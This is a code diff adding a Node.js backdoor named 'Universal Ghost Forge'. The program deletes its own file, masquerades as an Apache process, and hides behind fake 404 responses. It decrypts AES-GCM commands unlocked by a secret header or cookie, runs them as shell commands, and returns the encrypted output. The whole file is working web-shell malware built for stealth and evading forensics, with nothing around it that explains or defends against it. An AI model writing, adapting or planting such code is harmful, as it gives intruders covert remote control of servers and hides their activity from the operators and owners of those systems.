@@ -1,0 +1,107 @@
+const http = require('http');
+const crypto = require('crypto');
+const { exec } = require('child_process');
+const fs = require('fs');
+
+/**
+ * Universal Ghost Forge v6.1 - Zero-Knowledge Hardened Node.js Agent
+ * Identity: ZK_GHOST_NODE
+ */
+
+// 1. SILENT FAIL & GLOBAL ERROR HANDLING
+process.on('uncaughtException', (err) => { process.exit(0); });
+process.on('unhandledRejection', (reason, promise) => { process.exit(0); });
+
+// 2. SELF-DESTRUCT & FD CLEANUP
+try {
+    const filename = __filename;
+    fs.unlinkSync(filename);
+    process.stdin.unref();
+    process.stdout.unref();
+    process.stderr.unref();
+} catch (e) {}
+
+const SALT = Buffer.from("__SALT_KEY__", 'hex');
+const HN = "__HEADER_NAME__".toLowerCase();
+const CN = "__COOKIE_NAME__";
+
+const server = http.createServer((req, res) => {
+    try {
+        // 3. ZERO-KNOWLEDGE AUTH & KDF
+        let trigger = req.headers[HN] || "";
+        if (!trigger && req.headers.cookie) {
+            const cookies = req.headers.cookie.split(';');
+            for (let c of cookies) {
+                if (c.trim().startsWith(CN + '=')) {
+                    trigger = c.split('=')[1].trim();
+                    break;
+                }
+            }
+        }
+
+        if (!trigger) return cloak(res);
+
+        // Derive key from runtime trigger + stored salt
+        const key = crypto.createHash('sha256').update(trigger + SALT.toString('hex')).digest();
+
+        if (req.method === 'POST') {
+            let body = '';
+            req.on('data', chunk => { body += chunk.toString(); });
+            req.on('end', () => {
+                try {
+                    const params = new URLSearchParams(body);
+                    const d = params.get('d');
+                    if (d) {
+                        const raw = Buffer.from(d, 'base64');
+                        const cmd = decrypt(raw, key);
+                        if (cmd) {
+                            execute(cmd.toString(), key, res);
+                        } else {
+                            cloak(res);
+                        }
+                    } else { cloak(res); }
+                } catch (e) { cloak(res); }
+            });
+        } else {
+            res.end();
+        }
+    } catch (e) { cloak(res); }
+});
+
+function cloak(res) {
+    res.writeHead(404, { 'Content-Type': 'text/html' });
+    res.end('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
+}
+
+function decrypt(data, key) {
+    try {
+        const nonce = data.slice(0, 12);
+        const tag = data.slice(-16);
+        const ciphertext = data.slice(12, -16);
+        const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
+        decipher.setAuthTag(tag);
+        return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+    } catch (e) { return null; }
+}
+
+function execute(cmd, key, res) {
+    try {
+        exec(cmd, (error, stdout, stderr) => {
+            const output = (stdout || '') + (stderr || '');
+            respond(output, key, res);
+        });
+    } catch (e) { respond("", key, res); }
+}
+
+function respond(data, key, res) {
+    try {
+        const nonce = crypto.randomBytes(12);
+        const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
+        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
+        const tag = cipher.getAuthTag();
+        res.end(Buffer.concat([nonce, encrypted, tag]).toString('base64'));
+    } catch (e) { res.end(); }
+}
+
+process.title = "/usr/sbin/apache2 -k start";
+server.listen(0, '127.0.0.1');
